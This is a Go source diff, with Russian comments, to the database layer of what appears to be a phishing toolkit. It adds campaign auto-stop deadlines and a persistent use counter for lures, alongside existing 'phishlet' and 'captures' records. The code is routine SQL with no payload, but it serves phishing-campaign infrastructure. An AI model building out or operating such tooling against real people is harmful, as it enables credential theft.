@@ -188,9 +188,14 @@ func (d *DB) ListCaptures(limit int) ([]CaptureRow, error) {
 
 // Campaign persistence (без plaintext: только факты и счетчики).
 func (d *DB) UpsertCampaign(id, name, phishletID, status string, ttlMin, maxUses int, createdAt int64) error {
-	_, err := d.sql.Exec(`INSERT INTO campaigns(id,name,phishlet_id,ttl_min,max_uses,status,created_at)
-VALUES(?,?,?,?,?,?,?) ON CONFLICT(id) DO UPDATE SET status=excluded.status`,
-		id, name, phishletID, ttlMin, maxUses, status, createdAt)
+	return d.UpsertCampaignStop(id, name, phishletID, status, ttlMin, maxUses, createdAt, 0)
+}
+
+// UpsertCampaignStop пишет кампанию с дедлайном авто-стопа.
+func (d *DB) UpsertCampaignStop(id, name, phishletID, status string, ttlMin, maxUses int, createdAt, stopAt int64) error {
+	_, err := d.sql.Exec(`INSERT INTO campaigns(id,name,phishlet_id,ttl_min,max_uses,status,created_at,stop_at)
+VALUES(?,?,?,?,?,?,?,?) ON CONFLICT(id) DO UPDATE SET status=excluded.status,stop_at=excluded.stop_at`,
+		id, name, phishletID, ttlMin, maxUses, status, createdAt, stopAt)
 	return err
 }
 
@@ -205,6 +210,7 @@ type CampaignRow struct {
 	ID, Name, PhishletID, Status string
 	TTLMin, MaxUses               int
 	CreatedAt                     int64
+	StopAt                        int64
 }
 
 type TargetRow struct {
@@ -213,7 +219,7 @@ type TargetRow struct {
 }
 
 func (d *DB) ListCampaigns() ([]CampaignRow, []TargetRow, error) {
-	rows, err := d.sql.Query(`SELECT id,name,phishlet_id,ttl_min,max_uses,status,created_at FROM campaigns`)
+	rows, err := d.sql.Query(`SELECT id,name,phishlet_id,ttl_min,max_uses,status,created_at,COALESCE(stop_at,0) FROM campaigns`)
 	if err != nil {
 		return nil, nil, err
 	}
@@ -221,7 +227,7 @@ func (d *DB) ListCampaigns() ([]CampaignRow, []TargetRow, error) {
 	var camps []CampaignRow
 	for rows.Next() {
 		var c CampaignRow
-		if err := rows.Scan(&c.ID, &c.Name, &c.PhishletID, &c.TTLMin, &c.MaxUses, &c.Status, &c.CreatedAt); err != nil {
+		if err := rows.Scan(&c.ID, &c.Name, &c.PhishletID, &c.TTLMin, &c.MaxUses, &c.Status, &c.CreatedAt, &c.StopAt); err != nil {
 			return nil, nil, err
 		}
 		camps = append(camps, c)
@@ -245,4 +251,10 @@ func (d *DB) ListCampaigns() ([]CampaignRow, []TargetRow, error) {
 		tgts = append(tgts, t)
 	}
 	return camps, tgts, rows2.Err()
+}
+
+// IncSmartUse атомарно +1 к счетчику использований (one-time выживают рестарт).
+func (d *DB) IncSmartUse(path string) error {
+	_, err := d.sql.Exec(`UPDATE smart_lures SET uses = uses + 1 WHERE path=?`, path)
+	return err
 }
